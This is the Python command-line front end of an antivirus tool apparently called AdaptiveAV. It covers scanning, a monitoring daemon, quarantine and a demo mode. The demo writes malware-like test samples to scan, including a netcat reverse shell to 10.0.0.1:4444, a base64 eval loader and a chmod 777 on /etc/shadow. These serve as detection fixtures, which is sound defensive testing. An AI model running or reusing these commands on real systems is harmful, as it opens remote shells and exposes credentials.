#!/usr/bin/env python3
"""
AdaptiveAV v2 — AGI-like Antivirus Engine
==========================================

USAGE:
  python adaptiveav.py scan <path>              Scan file or directory
  python adaptiveav.py scan-browser             Scan all browsers
  python adaptiveav.py daemon start             Start real-time monitor
  python adaptiveav.py daemon stop              Stop real-time monitor
  python adaptiveav.py daemon status            Check daemon status
  python adaptiveav.py quarantine list          List quarantined items
  python adaptiveav.py quarantine restore <id>  Restore quarantined file
  python adaptiveav.py quarantine delete <id>   Permanently delete (user-confirmed)
  python adaptiveav.py watchlist                Show watchlist (needs confirmation)
  python adaptiveav.py watchlist isolate <id>   Move watchlist item to quarantine
  python adaptiveav.py protect <path>           Mark app as user-installed (never auto-quarantine)
  python adaptiveav.py learn <path> <label>     Teach engine (malicious|benign)
  python adaptiveav.py report                   Show full report
  python adaptiveav.py demo                     Run full demo
  python adaptiveav.py install-browser          Show browser extension install instructions

OPTIONS:
  --large     Enable 400M parameter model (slower, more accurate)
  --silent    Suppress per-file output
"""

import os
import sys
import time
import json
import tempfile
import random
import string
import platform
from pathlib import Path

# running as package, no need for manual sys.path modification

from adaptiveav.engine import AdaptiveAVEngine, C, cprint

# ─────────────────────────────────────────────────────────────────

def banner():
    cprint(C.CYAN + C.BOLD, r"""
  ╔══════════════════════════════════════════════════════════════╗
  ║  █████╗ ██████╗  █████╗ ██████╗ ████████╗██╗██╗   ██╗      ║
  ║ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██║██║   ██║      ║
  ║ ███████║██║  ██║███████║██████╔╝   ██║   ██║██║   ██║  v2  ║
  ║ ██╔══██║██║  ██║██╔══██║██╔═══╝    ██║   ██║╚██╗ ██╔╝      ║
  ║ ██║  ██║██████╔╝██║  ██║██║        ██║   ██║ ╚████╔╝       ║
  ║ ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝        ╚═╝   ╚═╝  ╚═══╝        ║
  ║   400M Param · Local-Only · Browser Shield · Auto-Isolate   ║
  ╚══════════════════════════════════════════════════════════════╝""")

def parse_args():
    args = sys.argv[1:]
    flags = {a for a in args if a.startswith("--")}
    args   = [a for a in args if not a.startswith("--")]
    return args, flags

def cmd_scan(engine: AdaptiveAVEngine, args: list):
    if not args:
        cprint(C.RED, "Usage: scan <path>"); return
    target = args[0]
    silent = "--silent" in sys.argv
    if os.path.isdir(target):
        cprint(C.BOLD, f"\n  Scanning directory: {target}\n  {'─'*60}")
        results = engine.scan_directory(target, show=not silent)
        threats = [r for r in results if r.verdict == "malicious"]
        watchlisted = [r for r in results if r.quarantine_action and r.quarantine_action.get("action") == "watchlist"]
        isolated    = [r for r in results if r.quarantine_action and r.quarantine_action.get("action") == "auto_isolated"]
        print()
        cprint(C.BOLD, f"  Summary: {len(results)} files scanned")
        cprint(C.RED,   f"    🔴 Threats  : {len(threats)}")
        cprint(C.RED,   f"    🔒 Isolated : {len(isolated)}")
        cprint(C.YELLOW,f"    👁  Watchlist: {len(watchlisted)}")
    else:
        if not os.path.exists(target):
            cprint(C.RED, f"  File not found: {target}"); return
        r = engine.scan(target)
        print()
        engine._print_result(r)
        if r.quarantine_action:
            qa = r.quarantine_action
            act = qa.get("action", "")
            if act == "auto_isolated":
                cprint(C.RED+C.BOLD, f"\n  🔒 AUTO-ISOLATED: {qa.get('reason', '')}")
            elif act == "watchlist":
                cprint(C.YELLOW, f"\n  👁  WATCHLIST: {qa.get('reason', '')}")
                cprint(C.DIM,    f"     Run 'watchlist isolate <id>' to quarantine manually")
        print(f"\n  Detection: {', '.join(r.detection_method)}")
        print(f"  Scan time: {r.scan_time_ms}ms")
    engine.report()

def cmd_scan_browser(engine: AdaptiveAVEngine):
    cprint(C.BOLD, "\n  Scanning all browsers...\n  " + "─"*60)
    results = engine.scan_browser()
    if not results:
        cprint(C.YELLOW, "  No supported browser profiles found.")
        cprint(C.DIM,    "  (Chrome, Firefox, Brave, Edge, Opera)")
        return
    total_threats = 0
    for br in results:
        engine.print_browser_result(br)
        total_threats += br.threat_count
    dl_threats = engine.browser_scanner.scan_downloads()
    if dl_threats:
        cprint(C.YELLOW, f"\n  📥 Suspicious downloads ({len(dl_threats)}):")
        for t in dl_threats:
            cprint(C.YELLOW, f"     {Path(t['path']).name} ({t['extension']}, {t['age_hours']:.1f}h old)")
    print()
    cprint(C.BOLD, f"  Total browser threats: {total_threats}")

def cmd_daemon(engine: AdaptiveAVEngine, args: list):
    from adaptiveav.file_watch import AVDaemon
    sub = args[0] if args else "status"
    if sub == "start":
        if AVDaemon.is_running():
            cprint(C.YELLOW, "  Daemon is already running.")
            return
        cprint(C.GREEN, "  Starting AdaptiveAV real-time protection daemon...")
        cprint(C.DIM,   "  Watching: Downloads, Desktop, /tmp, and LaunchAgents/autostart")
        cprint(C.DIM,   "  Press Ctrl+C to stop")
        daemon = AVDaemon(engine=engine)
        daemon.start(background=False)  # foreground

    elif sub == "stop":
        if not AVDaemon.is_running():
            cprint(C.YELLOW, "  Daemon is not running."); return
        from adaptiveav.file_watch import DAEMON_PID_FILE
        import signal
        try:
            pid = int(DAEMON_PID_FILE.read_text())
            os.kill(pid, signal.SIGTERM)
            cprint(C.GREEN, f"  Daemon stopped (PID {pid})")
        except Exception as e:
            cprint(C.RED, f"  Failed to stop: {e}")

    elif sub == "status":
        running = AVDaemon.is_running()
        if running:
            resp = AVDaemon.send_command({"action": "status"})
            cprint(C.GREEN+C.BOLD, "  ✅ Daemon is RUNNING")
            if resp:
                print(f"     PID: {resp.get('pid', '?')}")
                print(f"     Alerts: {resp.get('alerts', 0)}")
                dirs = resp.get("watch_dirs", [])
                print(f"     Watching: {', '.join(Path(d).name for d in dirs[:4])}")
        else:
            cprint(C.YELLOW, "  ⚪ Daemon is NOT running")
            cprint(C.DIM,    "     Run: python adaptiveav.py daemon start")

def cmd_quarantine(engine: AdaptiveAVEngine, args: list):
    qm = engine.quarantine
    sub = args[0] if args else "list"

    if sub == "list":
        items = qm.list_quarantine()
        if not items:
            cprint(C.GREEN, "  Quarantine is empty ✓"); return
        cprint(C.BOLD, f"\n  Quarantined Items ({len(items)}):")
        print("  " + "─"*70)
        for e in items:
            conf = f"{e['confidence']*100:.0f}%"
            print(f"  [{e['id']}] {C.RED}{e['risk_level']:8}{C.RESET} {Path(e['original_path']).name:<30} {conf:5} {e['threat_name'][:30]}")
        print()
        cprint(C.DIM, "  Commands: quarantine restore <id>  |  quarantine delete <id>")

    elif sub == "restore" and len(args) > 1:
        result = qm.restore(args[1])
        if result["success"]:
            cprint(C.GREEN, f"  ✅ Restored to: {result['path']}")
        else:
            cprint(C.RED, f"  ❌ {result['error']}")

    elif sub == "delete" and len(args) > 1:
        cprint(C.YELLOW+C.BOLD, f"  ⚠  Permanently delete quarantined file [{args[1]}]?")
        confirm = input("  Type 'yes' to confirm: ").strip().lower()
        if confirm == "yes":
            result = qm.confirm_delete(args[1])
            if result["success"]:
                cprint(C.GREEN, f"  ✅ {result['message']}")
            else:
                cprint(C.RED, f"  ❌ {result['error']}")
        else:
            cprint(C.DIM, "  Cancelled.")
    else:
        cprint(C.YELLOW, "  Usage: quarantine list | restore <id> | delete <id>")

def cmd_watchlist(engine: AdaptiveAVEngine, args: list):
    qm = engine.quarantine
    sub = args[0] if args else "list"

    if sub == "list" or sub != "isolate":
        items = qm.list_watchlist()
        if not items:
            cprint(C.GREEN, "  Watchlist is empty ✓"); return
        cprint(C.BOLD, f"\n  Watchlist ({len(items)} items — monitoring, NOT isolated):")
        print("  " + "─"*70)
        for e in items:
            conf = f"{e['confidence']*100:.0f}%"
            reason = e.get("reason", "")
            sha = e["sha256"][:12]
            print(f"  [{sha}] {C.YELLOW}{e['risk_level']:8}{C.RESET} {Path(e['path']).name:<30} {conf:5} {reason}")
        print()
        cprint(C.DIM, "  To isolate: watchlist isolate <id>")
        cprint(C.DIM, "  Note: user-installed apps require your confirmation before any action.")

    elif sub == "isolate" and len(args) > 1:
        result = qm.confirm_isolate_watchlist(args[1])
        if result["success"]:
            cprint(C.GREEN, f"  ✅ Isolated to quarantine")
        else:
            cprint(C.RED, f"  ❌ {result['error']}")

def cmd_protect(engine: AdaptiveAVEngine, args: list):
    if not args:
        cprint(C.RED, "Usage: protect <path>"); return
    path = args[0]
    if engine.protect_app(path):
        cprint(C.GREEN, f"  ✅ Protected: {path}")
        cprint(C.DIM,   "     This app will never be auto-quarantined.")
    else:
        cprint(C.RED, f"  ❌ Could not protect: {path}")

def cmd_install_browser():
    cprint(C.BOLD, "\n  Browser Extension Install Instructions")
    print("  " + "─"*50)
    cprint(C.CYAN, "\n  Chrome / Brave / Edge:")
    print("  1. Open chrome://extensions  (or brave://extensions / edge://extensions)")
    print("  2. Enable 'Developer mode' (top right toggle)")
    print("  3. Click 'Load unpacked'")
    print(f"  4. Select: {Path(__file__).parent / 'browser_ext'}")
    cprint(C.CYAN, "\n  Firefox:")
    print("  1. Open about:debugging#/runtime/this-firefox")
    print("  2. Click 'Load Temporary Add-on...'")
    print(f"  3. Select: {Path(__file__).parent / 'browser_ext' / 'manifest.json'}")
    print()
    cprint(C.GREEN, "  The extension provides:")
    print("    • Real-time malicious URL blocking")
    print("    • Download threat scanning")
    print("    • Inline JavaScript malware detection")
    print("    • Phishing & typosquatting alerts")
    print("    • 100% local — no data leaves your browser")

def cmd_demo():
    cprint(C.BOLD, "\n  ━━━  DEMO MODE  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
    engine = AdaptiveAVEngine()

    with tempfile.TemporaryDirectory() as tmpdir:
        files = {}

        # Clean files
        files["script.py"]       = b"def hello():\n    print('Hello World')\nhello()\n"
        files["config.json"]     = b'{"debug": false, "version": "1.0"}\n'
        files["readme.txt"]      = b"This is a benign documentation file.\n"

        # Malware-like
        files["loader.py"]       = (
            b"import base64, os\n"
            b"payload = base64.b64decode('aW1wb3J0IG9z')\n"
            b"eval(compile(payload, '<x>', 'exec'))\n"
            b"__import__('os').system('whoami')\n"
        )
        files["eicar.txt"]       = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\n"
        files["packed.bin"]      = bytes([random.randint(0,255) for _ in range(4096)])
        files["shell.sh"]        = b"#!/bin/sh\nnc -e /bin/sh 10.0.0.1 4444\ncmd.exe /c whoami\n"
        files["keylogger.py"]    = b"# password keylogger\nimport os\nos.system('chmod 777 /etc/shadow')\n"

        # Write
        for name, content in files.items():
            with open(os.path.join(tmpdir, name), "wb") as f:
                f.write(content)

        cprint(C.WHITE, f"  Created {len(files)} test files ({len([f for f in files if 'clean' not in f.lower()])} threats)\n")
        cprint(C.BOLD, "  ┌─ SCANNING ─────────────────────────────────────────────────┐")

        threats, clean, watchlisted, isolated = [], [], [], []
        for name in files:
            fpath = os.path.join(tmpdir, name)
            r = engine.scan(fpath)
            if r.verdict == "malicious": threats.append(r)
            else: clean.append(r)
            if r.quarantine_action:
                a = r.quarantine_action.get("action","")
                if a == "auto_isolated": isolated.append(r)
                elif a == "watchlist": watchlisted.append(r)
            engine._print_result(r)

        cprint(C.BOLD, "  └────────────────────────────────────────────────────────────┘\n")

        cprint(C.GREEN,  f"  ✅ Clean       : {len(clean)}")
        cprint(C.RED,    f"  🔴 Threats     : {len(threats)}")
        cprint(C.RED,    f"  🔒 Auto-Isolated: {len(isolated)}")
        cprint(C.YELLOW, f"  👁  Watchlisted : {len(watchlisted)}")

        # Demo: protect an app
        print()
        cprint(C.CYAN, "  ━━━  USER PROTECTION DEMO ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        cprint(C.WHITE, "  Marking script.py as user-installed (should never auto-quarantine)...")
        engine.protect_app(os.path.join(tmpdir, "script.py"))
        cprint(C.WHITE, "  Re-scanning after protection...")
        r2 = engine.scan(os.path.join(tmpdir, "script.py"))
        engine._print_result(r2)
        assert r2.quarantine_action is None or r2.quarantine_action.get("action") != "auto_isolated", \
            "Protected app should not be auto-isolated!"
        cprint(C.GREEN, "  ✅ Protected app was NOT auto-isolated as expected")

        # Demo: teach engine
        print()
        cprint(C.CYAN, "  ━━━  LEARNING DEMO ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        cprint(C.WHITE, "  Teaching engine: packed.bin = malicious...")
        engine.teach(os.path.join(tmpdir, "packed.bin"), "malicious")
        cprint(C.WHITE, "  Re-scanning packed.bin...")
        r3 = engine.scan(os.path.join(tmpdir, "packed.bin"))
        engine._print_result(r3)
        cprint(C.GREEN if r3.verdict == "malicious" else C.YELLOW,
               f"  Verdict after learning: {r3.verdict.upper()} ({r3.confidence*100:.0f}% confidence)")

        # Sandbox demo
        print()
        cprint(C.CYAN, "  ━━━  SANDBOX AVAILABILITY ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        sm = engine.quarantine.sandbox_mgr
        if sm.is_sandboxable():
            cprint(C.GREEN, f"  ✅ Sandboxing available on this system")
        else:
            cprint(C.YELLOW, "  ⚠  No sandbox tool found (install bwrap/firejail on Linux, or use macOS built-in)")

    engine.report()
    print()
    cprint(C.CYAN, "  ━━━  BROWSER EXTENSION ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    cprint(C.WHITE, "  Run: python adaptiveav.py install-browser")
    cprint(C.DIM,   "  Extension location: " + str(Path(__file__).parent / "browser_ext"))

# ─────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────

def main():
    banner()
    args, flags = parse_args()
    use_large = "--large" in flags

    if not args or args[0] == "demo":
        cmd_demo()
        return

    engine = AdaptiveAVEngine(use_large_model=use_large)

    cmd = args[0]
    rest = args[1:]

    if cmd == "scan":
        cmd_scan(engine, rest)
    elif cmd == "scan-browser":
        cmd_scan_browser(engine)
    elif cmd == "daemon":
        cmd_daemon(engine, rest)
    elif cmd == "quarantine":
        cmd_quarantine(engine, rest)
    elif cmd == "watchlist":
        cmd_watchlist(engine, rest)
    elif cmd == "protect":
        cmd_protect(engine, rest)
    elif cmd == "learn":
        if len(rest) < 2:
            cprint(C.RED, "Usage: learn <path> <malicious|benign>"); return
        if engine.teach(rest[0], rest[1]):
            cprint(C.GREEN, f"  ✅ Learned: {rest[0]} → {rest[1]}")
    elif cmd == "report":
        engine.report()
    elif cmd == "install-browser":
        cmd_install_browser()
    else:
        print(__doc__)


if __name__ == "__main__":
    main()